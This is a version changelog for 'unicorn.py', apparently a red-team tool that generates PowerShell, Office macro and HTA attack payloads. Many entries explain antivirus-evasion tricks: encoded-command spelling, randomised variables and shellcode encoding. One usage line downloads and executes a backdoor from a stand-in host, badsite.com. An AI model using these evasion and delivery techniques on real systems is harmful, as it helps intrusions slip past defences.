~~~~~~~~~~~~~~~~
version 2.3.4
~~~~~~~~~~~~~~~~

* added decoded base64 -encodedcommand for better av evasion

~~~~~~~~~~~~~~~~
version 2.3.3
~~~~~~~~~~~~~~~~

* most AVs were flagging on -enc instead of -EncodedCommand along with base64 would flag windows defender.. looks like this gets around it on both macro and standard ps1/encoded command params.

~~~~~~~~~~~~~~~~
version 2.3.2
~~~~~~~~~~~~~~~~

* change auto_open to autopen() - thanks @JAshton

~~~~~~~~~~~~~~~~
version 2.3.1
~~~~~~~~~~~~~~~~

* fix indent issue

~~~~~~~~~~~~~~~~
version 2.3
~~~~~~~~~~~~~~~~

* added support for windows/download_exec as a payload option - just run python unicorn.py windows/download_exec exe=exename.exe url=http://badsite.com/backdoor.exe - note it doesn't need to be an exe, whatever you want to download and execute
* fixes an issue that caused macro injection to not properly work (duplicate powershell command)

~~~~~~~~~~~~~~~~
version 2.2
~~~~~~~~~~~~~~~~

* pep8 formatting
* python3 conversion
* added randomized variables (not fully completed yet but its better than before) - AV picking up on variables and base64 encoded strings

~~~~~~~~~~~~~~~~
version 2.1.2
~~~~~~~~~~~~~~~~

* added enablestageencoding to true by default

~~~~~~~~~~~~~~~~
version 2.1.1
~~~~~~~~~~~~~~~~

* added --smallest flag to msfvenom generate which compacts shellcode to smaller size

~~~~~~~~~~~~~~~~
version 2.1
~~~~~~~~~~~~~~~~

* added ability to import your own powershell into attacks (thanks to curi0usJack pull request)
* fixed an issue when generating macro attack with appropriate spacing on macros

~~~~~~~~~~~~~~~~
version 2.0
~~~~~~~~~~~~~~~~

* added brand new hta attack vector for direct web application compromise (thanks Justin Elze)
* added brand new attack binary to cert (thanks Matthew Graeber)
* added window.close(); after script

~~~~~~~~~~~~~~~~
version 1.3
~~~~~~~~~~~~~~~~

* slimmed down powershell injection code even more
* when using windows/meterpreter/reverse_https, the option flags StagerURILength=5 StagerVerifySSLCert=false are specified in order to trim down payload. This is due to char restriction sizes when pasting into a command window. With these two settings, the codebase is slimmed down significantly and fits within the normal length 
* added support for shikata ga nai to obfuscate shellcode prior to utf and b64encoding. Will now through off sigs if contained inside of a file.

~~~~~~~~~~~~~~~~
version 1.2
~~~~~~~~~~~~~~~~

* fixed an issue where powershell injection may not work on 32 bit platforms
* shaved command line argument down around 32 bytes

version 1.1
~~~~~~~~~~~~~~~~

* fixed autoopen from not working on some office implementations - now works on all office documents including powerpoint/word/excel
* changed the open description to fix a typo and also make it more believable 
* fixed spacing issues when generating macro attack
* added instructions on when using macro on how to add the macro to an office document
* added better description and instructions for powershell injection
* added better description on initial loading of payload

~~~~~~~~~~~~~~~~

* incorporated new macro attack from Rik van Duijn RCX @rikduijn

* channeled stderr to subprocess.PIPE
* slimmed unicorn powershell injection code about 17 bytes to compact powershell injection

~~~~~~~~~~~~~~~~
version 0.5
~~~~~~~~~~~~~~~~

* fixed hidden window command when using powershell injection

~~~~~~~~~~~~~~~~
version 0.4

* shortened powershell injection code by removing un-used code and shortening initial command names
* removed EnableStageEncoding - after testing extensively, this can produce unreliable results. 
* fixed a bug that caused unicorn to not work properly due to changes with MSFVenom
* slimmed encoded powershell command, removed un-used else statement

~~~~~~~~~~~~~~~~
version 0.3
~~~~~~~~~~~~~~~~

* updated msfvenom to include format type and architecture to remove bug it would not generate appropriate shellcode
